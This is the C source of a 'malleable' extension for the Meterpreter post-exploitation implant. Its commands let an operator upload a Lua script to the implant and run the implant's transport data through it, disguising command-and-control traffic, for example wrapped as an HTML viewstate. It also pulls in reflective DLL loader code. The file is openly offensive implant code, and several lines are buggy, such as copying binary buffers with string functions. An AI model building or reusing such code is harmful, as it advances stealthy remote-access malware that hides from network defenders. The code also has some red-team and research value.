/*!
 * @file malleable.c
 * @brief Entry point and intialisation functionality for the malleable extention.
 */
#include "../../common/common.h"
#include "malleable.h"
#include "../../DelayLoadMetSrv/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

#include "..\extapi\clipboard.h"
#include <windows.h>
//#include "..\../server\metsrv.h"
// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv(); // this needs to be after all includes!



//static char * luaScript = "function encrypt(s);s = '<html> viewstate=\"' ..s ..  '\" </html>';return s;end;function encode(s);return s;end;";

Command customCommands[] =
{
	COMMAND_REQ("malleable_test_command", test),
	COMMAND_REQ("malleable_set_script", setScript),
	COMMAND_MALLEABLE("malleable_encode", malleableEncode),
	COMMAND_TERMINATOR
};

/*!
 * @brief Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	dprintf("MALLEABLE] Initializing malleable extension");
	hMetSrv = remote->met_srv;
	
	command_register_all(customCommands);
	
	return ERROR_SUCCESS;
}

/*!
 * @brief Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	dprintf("MALLEABLE] De-initializing malleable extension");
	command_deregister_all(customCommands);

	return ERROR_SUCCESS;
}

void bail(lua_State *L, char *msg){
	dprintf("[MALLEABLE-FATAL-LUA] FATAL ERROR:  %s: %s",
		msg, lua_tostring(L, -1));
}

DWORD setScript(Remote *remote, Packet *packet)
{
	dprintf("[MALLEABLE] Executing set script command");
	// Recieve Script
	char * recievedScript = packet_get_tlv_value_string(packet, TLV_TYPE_MALLEABLE_INTERFACES);
	dprintf("[MALLEABLE] Recieved and setting script: \"%s\"", recievedScript);
	luaScript = _strdup(recievedScript);
	// Send response
	Packet *response = packet_create_response(packet);
	int result = ERROR_SUCCESS;
	packet_add_tlv_string(response, TLV_TYPE_MALLEABLE_INTERFACES, "New script set");
	packet_transmit_response(result, remote, response);
	dprintf("[MALLEABLE] Finished set script command");
	return ERROR_SUCCESS;
}

char* malleableEncode(LPVOID buffer, DWORD size)
{
	dprintf("[MALLEABLE-ENCODE] Malleable encode start");
	BOOL result = ERROR_SUCCESS;
	if (buffer == NULL){
		dprintf("[MALLEABLE-ENCODE] Buffer reference was NULL!");
		result = 1; // TODO real error code 
	}
	/*
	if (size == NULL){
		dprintf("[MALLEABLE-ENCODE] size reference was NULL!");
		result = ERROR; // TODO real error code 
	}
	*/
	if (result == ERROR_SUCCESS){
		

		dprintf("[MALLEABLE-ENCODE] Starting buffer stuff");
		dprintf("[MALLEABLE-ENCODE] Size: %i", size);
		void *dest = malloc((size_t)size + 1); // i think need to free data mby +1 needs to go away 
		//strcpy_s((const char*)data, (size_t)size, (char*) buffer); //mby manually null terminate
		// this things is probalby terminating on null bytes, we dont wan't that we want to copy everything!

		strncpy_s((char*)dest , (size_t)size+1, (char*)buffer, (size_t)size-1); 
		dprintf("[MALLEABLE-ENCODE] String address: %x", dest);
		dprintf("[MALLEABLE-ENCODE] String: %s", dest);
		//if (!strcmp(dest, ""))
		//{
			dprintf("[MALLEABLE-ENCODE] Encoding for transport.");
			lua_State *L;
			L = luaL_newstate();                        /* Create Lua state variable */
			luaL_openlibs(L);                           /* Load Lua libraries */
			dprintf("[MALLEABLE] luaL_loadstring(): script: \"%s\"", luaScript);
			if (luaL_loadstring(L, luaScript)) /* Load but don't run the Lua scripnt */
				bail(L, "luaL_loadstring() failed");      /* Error out if file can't be read */
			dprintf("[MALLEABLE-ENCODE] lua_pcall(0,0,0) (init)");
			dprintf("[MALLEABLE-ENCODE] LUA pcall answer: %i", lua_pcall(L, 0, 0, 0));
			//if (lua_pcall(L, 0, 0, 0))                  /* PRIMING RUN. FORGET THIS AND YOU'RE TOAST */
			//	bail(L, "lua_pcall() failed");          /* Error out if Lua file has an error */
			dprintf("[MALLEABLE-ENCODE] LUA getglobal");
			lua_getglobal(L, "encode");
			dprintf("[MALLEABLE-ENCODE] LUA pushlstring");
			dprintf("[MALLEABLE-ENCODE] LUA pushlstring %s", lua_pushlstring(L, dest, (size_t)size)); // casting without checking!
			dprintf("[MALLEABLE-ENCODE] lua_pcall() (encode)");
			if (lua_pcall(L, 1, 1, 0))
				bail(L, "lua_pcall() failed");
			const char *encodedOut = lua_tostring(L, -1);
			dprintf("[MALLEABLE-ENCODE] Got \"%s\" back from lua_tostring()", encodedOut);
			dprintf("[MALLEABLE-ENCODE] Giving buffer(%x) address %x", encodedOut);
			dprintf("[MALLEABLE-ENCODE] Still going strong");
			free(dest);
			lua_close(L);
			dprintf("[MALLEABLE-ENCODE] Still working");
			return _strdup(encodedOut);
		//}
	}
	
	dprintf("[MALLEABLE-ENCODE] Malleable encode end");
	return NULL;
}

DWORD test(Remote *remote, Packet *packet)
{
	lua_State *L;

	L = luaL_newstate();                        /* Create Lua state variable */
	luaL_openlibs(L);                           /* Load Lua libraries */
	dprintf("[MALLEABLE] luaL_loadstring(): script: \"%s\"", luaScript);
	if (luaL_loadstring(L, luaScript)) /* Load but don't run the Lua script */
		bail(L, "luaL_loadstring() failed");      /* Error out if file can't be read */
	dprintf("[MALLEABLE] lua_pcall(0,0,0) (init)");
	if (lua_pcall(L, 0, 0, 0))                  /* PRIMING RUN. FORGET THIS AND YOU'RE TOAST */
		bail(L, "lua_pcall() failed");          /* Error out if Lua file has an error */

	lua_getglobal(L, "encrypt");
	lua_pushstring(L, "evilMeterpreterData");
	dprintf("[MALLEABLE] lua_pcall() (encrypt)");
	if (lua_pcall(L, 1, 1, 0))
		bail(L, "lua_pcall() failed");
	const char *encryptedOut = lua_tostring(L, -1);
	dprintf("Got \"%s\" back from lua_tostring()", encryptedOut);

	Packet *response = packet_create_response(packet);
	int result = ERROR_SUCCESS;
	packet_add_tlv_string(response, TLV_TYPE_MALLEABLE_INTERFACES, encryptedOut);
	packet_transmit_response(result, remote, response);
	lua_close(L);
	dprintf("[MALLEABLE] testCommandEnd");
	return ERROR_SUCCESS;
}